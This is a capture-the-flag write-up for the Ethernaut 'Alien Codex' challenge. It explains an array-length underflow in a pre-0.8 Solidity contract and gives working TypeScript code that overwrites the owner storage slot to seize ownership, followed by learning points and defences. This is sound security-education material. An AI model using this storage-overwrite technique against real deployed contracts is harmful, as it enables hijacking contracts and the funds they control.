# Ethernaut - Alien Codex Solution Record

This project is a solution for the Alien Codex level in the [Ethernaut](https://ethernaut.openzeppelin.com/) smart contract security challenge game.

## Challenge Objective

In the Alien Codex challenge, we need to seize ownership of the contract (change the owner to our address).

## Contract Analysis

This contract inherits from the `Ownable` contract and contains the following main components:

```solidity
contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Vulnerability Analysis

The contract contains two main vulnerabilities:

1. **Integer Underflow**: In the `retract()` function, when the `codex` array is empty, `codex.length--` causes a length underflow, becoming 2^256-1, which allows us to access arbitrary storage locations.

2. **Storage Layout Knowledge**: By leveraging knowledge of Solidity storage layout, we can modify the contract's `owner` variable by manipulating the `codex` array.

## Solution Strategy

The solution steps are as follows:

1. Call `makeContact()` to set `contact = true`, so we can use other functions that require the `contacted` modifier.

2. Call the `retract()` function to cause the `codex` array length to underflow, allowing us to access arbitrary storage locations.

3. Calculate the `codex` array index corresponding to the storage location of the `owner` variable:
   - In Solidity, dynamic array `codex` data starts from `keccak256(slot_of_codex) + 0, 1, 2, ...`
   - The `owner` variable is in storage slot 0
   - The `codex` array is in storage slot 1
   - Therefore we need to find an index `i` such that: `keccak256(1) + i ≡ 0 (mod 2^256)`
   - So `i = 2^256 - keccak256(1)`

4. Call the `revise(i, address)` function, passing in the calculated index and our address (padded to 32 bytes), to change the `owner` to our address.

## Code Implementation

```typescript
// 1. makeContact
await alienCodex.makeContact();

// 2. Cause integer underflow through retract, making codex array length 2^256-1
await alienCodex.retract();

// 3. Calculate the array index for owner position
const codexArrayStorageSlot = "0x0000000000000000000000000000000000000000000000000000000000000001";
const codexDataStartStorageSlot = ethers.keccak256(codexArrayStorageSlot);
const NUMBER_OF_SLOTS = BigInt(2) ** BigInt(256);
const ownerPositionInMap = NUMBER_OF_SLOTS - BigInt(codexDataStartStorageSlot);

// 4. Use revise to change owner to our address
const parsedAddress = ethers.zeroPadValue(signer.address, 32);
await alienCodex.revise(ownerPositionInMap, parsedAddress);
```

## Learning Points

1. **Solidity Storage Layout**: Understanding how Solidity lays out variables in storage, especially storage layout for inherited contracts and storage methods for dynamic arrays.

2. **Integer Underflow Risk**: Before Solidity version 0.8.0, integer operations didn't automatically check for overflow/underflow, leading to many security vulnerabilities.

3. **EVM Storage Mechanism**: Understanding the EVM's storage slot mechanism, with each slot being 32 bytes, and how to indirectly change one variable by manipulating another.

4. **Array Access Control**: Contracts should implement strict array index range checking to prevent out-of-bounds access.

5. **Contract Security**: This challenge emphasizes the importance of understanding low-level implementation details in smart contract development.

## Defense Measures

To prevent similar vulnerabilities, the following measures can be taken:

1. Use SafeMath library or Solidity 0.8.0+ versions to prevent integer overflow/underflow.
2. Implement strict access control and index range checking.
3. Ensure array operations are safe, especially when reducing length.
4. Implement multi-verification mechanisms for sensitive operations (such as ownership changes).

## Summary

The Alien Codex challenge demonstrates the serious security vulnerabilities that can result from the combination of Solidity storage layout and integer underflow. By understanding how the EVM works, we can cleverly exploit design flaws in contracts to hijack contract ownership.
